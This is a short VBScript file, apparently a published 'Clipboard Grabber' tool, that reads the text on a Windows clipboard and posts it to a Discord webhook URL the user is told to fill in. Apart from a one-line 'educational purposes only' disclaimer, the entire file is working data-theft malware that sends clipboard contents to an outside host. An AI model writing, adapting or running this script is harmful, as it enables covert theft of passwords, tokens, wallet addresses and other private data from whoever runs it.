Option Explicit
'Clipboard Grabber by xcorr.
'See more projects: https://github.com/xcorrr
'Educational Purposes only.
'NOTE: Replace the webhook url with your discord webhook Url's
Dim objHTML, ClipboardText, http, WebhookURL, ReturnErrMsg, JsonGrabbedMsg
Set objHTML = CreateObject("htmlfile")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
WebhookURL = "https://discord.com/api/webhooks/xxxxxxx/xxxxxxx"
On Error Resume Next
ClipboardText = objHTML.ParentWindow.ClipboardData.GetData("Text")
On Error GoTo 0

If IsEmpty(ClipboardText) Or Len(ClipboardText) = 0 Then
    ReturnErrMsg = "{""content"":""```Error: No Current Clipboard Data.```""}"
    http.Open "POST", WebhookURL, False
    http.SetRequestHeader "Content-Type", "application/json"
    http.Send ReturnErrMsg
Else
    ClipboardText = Replace(ClipboardText, """", "\""")
    JsonGrabbedMsg = "{""content"":""```Clipboard Data Grabbed. Content: " & ClipboardText & "```""}"
    http.Open "POST", WebhookURL, False
    http.SetRequestHeader "Content-Type", "application/json"
    http.Send JsonGrabbedMsg
End If